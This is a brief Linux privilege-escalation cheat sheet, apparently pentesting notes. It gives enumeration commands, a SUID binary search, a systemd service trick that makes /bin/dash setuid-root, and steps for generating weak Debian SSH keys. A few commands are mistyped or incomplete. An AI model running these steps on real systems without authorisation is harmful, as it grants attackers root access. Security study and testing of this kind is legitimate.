# Priv-Esc Linux

## **Tools**

- [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration)
- [LinEnum](https://github.com/rebootuser/LinEnum)

---

## **Kernel Exploitation**

### Check version

```bash
uname -a
cat /etc/*release
cat /etc/issue
```

### Check exploit

```bash
searchsploit linux kernel | grep -v dos | grep <kernel_version> | grep -i 'root|privilege|exploit'
```

---

## **Programms running**

```bash
ps -aux | grep root
https://github.com/DominicBreuker/pspy 
```

---

## **Services listening**

```bash
netstat -latupen | grep LISTEN
netstat -nlt | awk -F : '/\<tcp\>/ {split($2,a," "); print a[1]}' | xargs -I % bash -c 'echo -ne "\033[1;33m[+]\033[m Port %:\t$(timeout 1 cat </dev/tcp/127.0.0.1/%)\n"'
netstat -nlt | grep 'tcp ' | grep -Eo "[1-9][0-9]*" | xargs -I {} sh -c "echo "" | nc -v -n -w1 127.0.0.1 {}"
```

---

## **Binaries enum**

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

---

## **Docker**

```bash
# we look for docker.sock
find / -group docker -exec ls -la {} 2>/dev/null \;
```

---

## **Systemd**

```bash
echo -e '#!/bin/bash\nchmod 4755 /bin/dash' > /tmp/priv.sh 
vi /lib/systemd/system/debug.service 
edit line : ExecStart in `/tmp/priv.sh
reboot
```

---

## **Debian-ssh**

- [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

```bash
git clone https://github.com/g0tmi1k/debian-ssh.git
de debian-ssh/our_tools/
tar xvjf ubunturoot.tar.bz2

cp dokeygen.sh 
chroot ubunturoot /dokeygen.sh 1 -t dsa -b 1024 -f /tmp/dsa_1024_1

ssh-keygen -l -E md5 -f ~/.ssh/id_rsa.

#add "PubkeyAcceptedKeyTypes +ssh-dss" into client ssh conf
#ssh -vvvvvvvvvvvvvvvvvvvvv helps to understand !
```


